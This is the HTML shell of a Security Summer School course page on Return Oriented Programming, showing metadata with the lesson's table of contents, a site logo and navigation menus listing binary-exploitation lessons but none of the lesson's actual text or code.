<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=generator content="Hugo 0.101.0"><meta name=robots content="index, follow"><link rel="shortcut icon" href=/favicons/favicon.ico><link rel=apple-touch-icon href=/favicons/apple-touch-icon-180x180.png sizes=180x180><link rel=icon type=image/png href=/favicons/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=/favicons/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/favicons/android-36x36.png sizes=36x36><link rel=icon type=image/png href=/favicons/android-48x48.png sizes=48x48><link rel=icon type=image/png href=/favicons/android-72x72.png sizes=72x72><link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96><link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144><link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192><title>Security Summer School</title><meta name=description content="Return Oriented Programming Table of Contents Prerequisites Recap - ASLR Solution - GOT and PLT Further Inspection Return Oriented Programming (ROP) Motivation NOP Analogy Gadgets and ROP Chains Code Execution Changing Register Values Clearing the Stack Some Useful Tricks Memory Spraying checksec in pwndbg Finding Gadgets in pwndbg Further Reading Linux x86 Program Start Up The .plt.sec Schema More about CET and endbr TLDR Putting it all Together: Demo Calling a Function Calling a Function with Parameters Calling Multiple Functions Finding Gadgets - ROPgadget Challenges 01."><meta property="og:title" content><meta property="og:description" content="Return Oriented Programming Table of Contents Prerequisites Recap - ASLR Solution - GOT and PLT Further Inspection Return Oriented Programming (ROP) Motivation NOP Analogy Gadgets and ROP Chains Code Execution Changing Register Values Clearing the Stack Some Useful Tricks Memory Spraying checksec in pwndbg Finding Gadgets in pwndbg Further Reading Linux x86 Program Start Up The .plt.sec Schema More about CET and endbr TLDR Putting it all Together: Demo Calling a Function Calling a Function with Parameters Calling Multiple Functions Finding Gadgets - ROPgadget Challenges 01."><meta property="og:type" content="article"><meta property="og:url" content="/binary/return-oriented-programming/"><meta property="article:section" content="binary"><meta property="og:site_name" content="Security Summer School"><meta itemprop=name content><meta itemprop=description content="Return Oriented Programming Table of Contents Prerequisites Recap - ASLR Solution - GOT and PLT Further Inspection Return Oriented Programming (ROP) Motivation NOP Analogy Gadgets and ROP Chains Code Execution Changing Register Values Clearing the Stack Some Useful Tricks Memory Spraying checksec in pwndbg Finding Gadgets in pwndbg Further Reading Linux x86 Program Start Up The .plt.sec Schema More about CET and endbr TLDR Putting it all Together: Demo Calling a Function Calling a Function with Parameters Calling Multiple Functions Finding Gadgets - ROPgadget Challenges 01."><meta itemprop=wordCount content="6618"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="Return Oriented Programming Table of Contents Prerequisites Recap - ASLR Solution - GOT and PLT Further Inspection Return Oriented Programming (ROP) Motivation NOP Analogy Gadgets and ROP Chains Code Execution Changing Register Values Clearing the Stack Some Useful Tricks Memory Spraying checksec in pwndbg Finding Gadgets in pwndbg Further Reading Linux x86 Program Start Up The .plt.sec Schema More about CET and endbr TLDR Putting it all Together: Demo Calling a Function Calling a Function with Parameters Calling Multiple Functions Finding Gadgets - ROPgadget Challenges 01."><link rel=preload href=/scss/main.min.5aef8a3f4159801f5dbe642e33f5332212e837eda91d37dcd891fdcd5c32498a.css as=style><link href=/scss/main.min.5aef8a3f4159801f5dbe642e33f5332212e837eda91d37dcd891fdcd5c32498a.css rel=stylesheet integrity><script src=https://code.jquery.com/jquery-3.6.0.min.js integrity=sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK crossorigin=anonymous></script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-00000000-0","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=td-page><header><nav class="js-navbar-scroll navbar navbar-expand navbar-dark flex-column flex-md-row td-navbar"><a class=navbar-brand href=/><span class=navbar-logo><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 500 500" style="enable-background:new 0 0 500 500"><g><path style="fill:#fff" d="M116.8525 421.9722c-5.7041.0-10.3442-4.3127-10.3442-9.6129V88.183c0-5.3002 4.6401-9.6117 10.3442-9.6117H320.858c3.0347.0 9.3959.5498 11.7506 2.6302l.3545.3442 58.905 63.2912c2.3101 2.491 2.9202 8.4928 2.9202 11.3184v256.2039c0 5.3002-4.6407 9.6129-10.3436 9.6129H116.8525z"/><g><g><g><path style="fill:#767676" d="M384.4445 423.2066H116.852c-6.3839.0-11.5786-4.8658-11.5786-10.8474V88.1831c0-5.9804 5.1947-10.8461 11.5786-10.8461h204.0062c.377.0 9.2786.0329 12.568 2.9389l.3947.3833 58.9508 63.337c3.2135 3.4652 3.2514 11.7924 3.2514 12.1593v256.2036C396.0231 418.3408 390.8284 423.2066 384.4445 423.2066zM116.5079 411.9189c.0848.0278.1999.0531.3441.0531h267.5925c.1442.0.2581-.0253.3441-.0531V156.1556c-.0076-.9033-.3593-3.7347-.7034-5.0037l-57.6527-61.9416c-1.4651-.3176-4.4533-.6389-5.5742-.6389H116.852c-.143.0-.2594.024-.3441.0531V411.9189zm267.4533-261.149zM327.0321 89.371v.0013V89.371z"/></g></g></g><g><g><path style="fill:#5b7fc0" d="M189.0874 210.1754l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4473C177.5953 212.627 183.0601 210.1742 189.0874 210.1754zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 234.1722 197.0804 232.033z"/><path style="opacity:.3;fill:#fff" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/><g><defs><path id="SVGID_1_" d="M194.7376 237.6875c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 234.2399 196.1861 236.239 194.7376 237.6875z"/></defs><clipPath id="SVGID_2_"><use xlink:href="#SVGID_1_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_2_);fill:#fff" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/><path style="opacity:.13;clip-path:url(#SVGID_2_);fill:#020202" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/></g><g><defs><path id="SVGID_3_" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/></defs><clipPath id="SVGID_4_"><use xlink:href="#SVGID_3_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_4_);fill:#5b7fc0" d="M172.6595 215.6045c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8475-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 209.1953 176.6171 211.647 172.6595 215.6045z"/></g></g><rect x="198.8952" y="225.1043" style="fill:#5b7fc0" width="122.6266" height="13.8671"/></g><g><path style="fill:#d95140" d="M189.0874 155.7611l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.0249 2.454-11.4897 6.4116-15.4473C177.5953 158.2128 183.0601 155.7599 189.0874 155.7611zm7.993 21.8577c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.2508 181.7667 197.0816 179.758 197.0804 177.6188z"/><path style="opacity:.3;fill:#fff" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/><g><defs><path id="SVGID_5_" d="M194.7376 183.2733c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 179.8256 196.1861 181.8248 194.7376 183.2733z"/></defs><clipPath id="SVGID_6_"><use xlink:href="#SVGID_5_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_6_);fill:#fff" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/><path style="opacity:.13;clip-path:url(#SVGID_6_);fill:#020202" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/></g><g><defs><path id="SVGID_7_" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/></defs><clipPath id="SVGID_8_"><use xlink:href="#SVGID_7_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_8_);fill:#d95140" d="M172.6595 161.1903c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 154.7811 176.6171 157.2327 172.6595 161.1903z"/></g><rect x="198.8952" y="170.69" style="fill:#d95140" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#56a55c" d="M189.5379 264.6147l.0012-.0012c7.7751.0012 15.0294 4.1862 18.932 10.9235 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032-5.8394.0-11.3281-2.2733-15.458-6.4032-4.13-4.13-6.4032-9.6186-6.4056-15.4628.0012-6.0249 2.454-11.4897 6.4116-15.4472C178.0458 267.0663 183.5105 264.6135 189.5379 264.6147zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6538 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.7013 290.6202 197.5321 288.6115 197.5309 286.4723z"/><path style="opacity:.3;fill:#fff" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/><g><defs><path id="SVGID_9_" d="M195.1881 292.1268c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9941 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.5344 288.6792 196.6366 290.6783 195.1881 292.1268z"/></defs><clipPath id="SVGID_10_"><use xlink:href="#SVGID_9_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_10_);fill:#fff" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/><path style="opacity:.13;clip-path:url(#SVGID_10_);fill:#020202" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/></g><g><defs><path id="SVGID_11_" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/></defs><clipPath id="SVGID_12_"><use xlink:href="#SVGID_11_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_12_);fill:#56a55c" d="M173.11 270.0439c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7325-11.1497-10.9151-18.926-10.9151C182.5311 263.6346 177.0676 266.0863 173.11 270.0439z"/></g></g><rect x="199.3456" y="279.5436" style="fill:#56a55c" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#f1bc42" d="M189.0874 318.7208l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3305-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4472C177.5953 321.1724 183.0601 318.7196 189.0874 318.7208zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 342.7176 197.0804 340.5784z"/><path style="opacity:.3;fill:#fff" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/><g><defs><path id="SVGID_13_" d="M194.7376 346.2329c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 342.7853 196.1861 344.7844 194.7376 346.2329z"/></defs><clipPath id="SVGID_14_"><use xlink:href="#SVGID_13_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_14_);fill:#fff" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/><path style="opacity:.13;clip-path:url(#SVGID_14_);fill:#020202" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/></g><g><defs><path id="SVGID_15_" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/></defs><clipPath id="SVGID_16_"><use xlink:href="#SVGID_15_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_16_);fill:#f1bc42" d="M172.6595 324.15c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8474-1.0151-7.6327-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 317.7407 176.6171 320.1924 172.6595 324.15z"/></g></g><rect x="198.8952" y="333.6497" style="fill:#f1bc42" width="122.6266" height="13.8671"/></g></g></svg></span><span class=font-weight-bold>Security Summer School</span></a><div class="td-navbar-nav-scroll ml-md-auto" id=main_navbar><ul class="navbar-nav mt-2 mt-lg-0"><li class="nav-item mr-4 mb-2 mb-lg-0"><a class="nav-link active" href=/binary/><span class=active>Binary Exploitation</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/web/><span>Web Security</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/community/><span>Community</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/docs/><span>Documentation</span></a></li></ul></div><div class="navbar-nav d-none d-lg-block"><input type=search class="form-control td-search-input" placeholder="&#xf002; Search this site…" aria-label="Search this site…" autocomplete=off></div></nav></header><div class="container-fluid td-outer"><div class=td-main><div class="row flex-xl-nowrap"><aside class="col-12 col-md-3 col-xl-2 td-sidebar d-print-none"><div id=td-sidebar-menu class=td-sidebar__inner><form class="td-sidebar__search d-flex align-items-center"><input type=search class="form-control td-search-input" placeholder="&#xf002; Search this site…" aria-label="Search this site…" autocomplete=off>
<button class="btn btn-link td-sidebar__toggle d-md-none p-0 ml-3 fas fa-bars" type=button data-toggle=collapse data-target=#td-section-nav aria-controls=td-section-nav aria-expanded=false aria-label="Toggle section navigation"></button></form><nav class="collapse td-sidebar-nav" id=td-section-nav><ul class="td-sidebar-nav__section pr-md-3 ul-0"><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child active-path" id=m-binary-li><a href=/binary/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__section tree-root" id=m-binary><span>Binary Exploitation</span></a><ul class=ul-1><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybuffer-exploitation-li><a href=/binary/buffer-exploitation/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybuffer-exploitation><span>Buffer Exploitation</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarydefense-mechanisms-li><a href=/binary/defense-mechanisms/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarydefense-mechanisms><span>Defense Mechanisms</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarydynamic-analysis-li><a href=/binary/dynamic-analysis/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarydynamic-analysis><span>Dynamic Analysis</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryexecutables-and-processes-li><a href=/binary/executables-and-processes/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryexecutables-and-processes><span>Executables and Processes</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryexploration-tools-li><a href=/binary/exploration-tools/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryexploration-tools><span>Exploration Tools</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryinformation-leaks-li><a href=/binary/information-leaks/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryinformation-leaks><span>Information Leaks</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child active-path" id=m-binaryreturn-oriented-programming-li><a href=/binary/return-oriented-programming/ title class="align-left pl-0 active td-sidebar-link td-sidebar-link__page" id=m-binaryreturn-oriented-programming><span class=td-sidebar-nav-active-item>Return Oriented Programming</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryreturn-oriented-programming-advanced-li><a href=/binary/return-oriented-programming-advanced/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryreturn-oriented-programming-advanced><span>Return Oriented Programming Advanced</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryshellcodes-li><a href=/binary/shellcodes/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryshellcodes><span>Shellcodes</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryshellcodes-advanced-li><a href=/binary/shellcodes-advanced/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryshellcodes-advanced><span>Shellcodes Advanced</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarystatic-analysis-li><a href=/binary/static-analysis/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarystatic-analysis><span>Static Analysis</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybypassing-mitigationsactivities03-tutorial-bypass-dep-no-aslr-libcreadme-li><a href=/binary/bypassing-mitigations/activities/03-tutorial-bypass-dep-no-aslr-libc/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybypassing-mitigationsactivities03-tutorial-bypass-dep-no-aslr-libcreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybypassing-mitigationsactivities08-challenge-bypass-dep-no-aslr-libcreadme-li><a href=/binary/bypassing-mitigations/activities/08-challenge-bypass-dep-no-aslr-libc/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybypassing-mitigationsactivities08-challenge-bypass-dep-no-aslr-libcreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybypassing-mitigationsactivities09-challenge-bypass-dep-aslr-libcreadme-li><a href=/binary/bypassing-mitigations/activities/09-challenge-bypass-dep-aslr-libc/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybypassing-mitigationsactivities09-challenge-bypass-dep-aslr-libcreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarycontributing-li><a href=/binary/contributing/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarycontributing><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarycopying-li><a href=/binary/copying/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarycopying><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryextrapwntools-introreadme-li><a href=/binary/extra/pwntools-intro/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryextrapwntools-introreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryreviewing-li><a href=/binary/reviewing/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryreviewing><span></span></a></li></ul></li></ul></nav></div></aside><aside class="d-none d-xl-block col-xl-2 td-sidebar-toc d-print-none"><div class="td-page-meta ml-2 pb-1 pt-2 mb-0"><a href=https://github.com/security-summer-school/security-summer-school.github.io/tree/main/content/en/binary/return-oriented-programming/index.md 